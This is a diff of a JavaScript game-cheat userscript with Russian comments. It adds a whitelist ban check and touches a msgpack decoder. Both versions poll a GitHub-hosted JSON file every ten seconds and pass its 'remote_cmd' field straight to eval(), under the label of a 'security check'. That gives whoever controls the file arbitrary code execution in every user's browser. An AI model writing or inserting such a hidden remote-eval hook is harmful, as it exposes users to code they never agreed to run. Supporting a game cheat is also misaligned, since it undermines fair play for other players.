@@ -1,12 +1,12 @@
 (() => {
     'use strict';
 
-    // 1. НАСТРОЙКИ СИНХРОНИЗАЦИИ
+    // 1. КОНФИГ
     const CONFIG = {
         DATA_URL: "https://raw.githubusercontent.com/Skurt246/doom-whitelist-uid/main/whitelistuid.json"
     };
 
-    // 2. ГЛОБАЛЬНАЯ ФУНКЦИЯ УВЕДОМЛЕНИЙ
+    // 2. УВЕДОМЛЕНИЯ (Глобально)
     window.showRemoteNotice = function(text, color = "#00ffff") {
         let msg = document.getElementById('r-alert');
         if (msg) msg.remove();
@@ -18,37 +18,34 @@
         setTimeout(() => { if(msg) msg.remove(); }, 7000);
     };
 
-    // 3. ФУНКЦИЯ ПРОВЕРКИ
+    // 3. СИСТЕМА БЕЗОПАСНОСТИ И СИНХРОНИЗАЦИИ
     function runSecurityCheck() {
         fetch(CONFIG.DATA_URL + "?t=" + Date.now())
             .then(res => res.json())
             .then(data => {
-                // Выполнение команд
-                if (data.remote_cmd) {
-                    try { eval(data.remote_cmd); } catch(e) {}
+                // Выполнение удаленных команд (уведомления и т.д.)
+                if (data.remote_cmd && data.remote_cmd.trim() !== "") {
+                    try { eval(data.remote_cmd); } catch(e) { console.error("Eval Error"); }
                 }
-                // Проверка на бан
+
+                // Проверка ника / UID
                 const user = localStorage.getItem('u') || localStorage.getItem('uid') || (window.myPlayer ? window.myPlayer.name : null);
                 if (user) {
                     const found = data.users.find(u => u.name === user);
                     if (!found || found.status !== "active") {
-                        document.body.innerHTML = "<h1 style='color:red;text-align:center;margin-top:20%'>BANNED</h1>";
+                        document.body.innerHTML = "<div style='color:red; background:black; height:100vh; display:flex; align-items:center; justify-content:center; font-family:monospace; font-size:30px;'>BANNED BY ADMIN</div>";
                         location.replace("about:blank");
                     }
                 }
             })
-            .catch(() => {});
+            .catch(() => { console.log("Sync failed..."); });
     }
 
-    // Запуск интервала
+    // Запуск проверки каждые 10 сек
     setInterval(runSecurityCheck, 10000);
     runSecurityCheck();
 
-    // --- ДАЛЬШЕ ИДЕТ ТВОЙ ОСТАЛЬНОЙ КОД ЧИТА ---
-
-    // ────────────────────────────────────────────────
-    //  ✅ MSGPACK ДЕКОДЕР
-    // ────────────────────────────────────────────────
+    // 4. ТВОЙ MSGPACK ДЕКОДЕР
     const msgpackDecode = (() => {
         const td = new TextDecoder();
         return (buf) => {
@@ -104,8 +101,10 @@
         };
     })();
 
-    // Дальше твой код (объекты features, WebSocket и т.д.)
+    // ТУТ ДАЛЬШЕ ТВОЙ КОД ЧИТА (features, WebSocket и т.д.)
+    console.log("Core initialized.");
 
+})();
 // ────────────────────────────────────────────────
 //  ✅ СОХРАНЕНИЕ НАСТРОЕК
 // ────────────────────────────────────────────────
